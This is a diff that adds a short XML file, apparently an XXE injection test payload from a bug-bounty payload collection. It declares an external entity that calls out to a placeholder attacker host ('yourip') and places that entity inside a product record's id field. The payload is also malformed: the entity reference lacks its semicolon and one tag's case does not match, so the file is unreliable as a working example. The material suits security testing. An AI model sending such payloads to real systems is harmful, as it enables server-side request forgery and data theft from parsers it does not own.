@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://yourip/test.ext" >]>
+
+<!--<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>-->
+
+<!--<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>-->
+
+<Prod>
+
+<Prod>
+
+<Type>abc</type>
+
+<name>Bugcrowd</name>
+
+<id>&xxe</id>
+
+</Prod>
+
+</Prod>
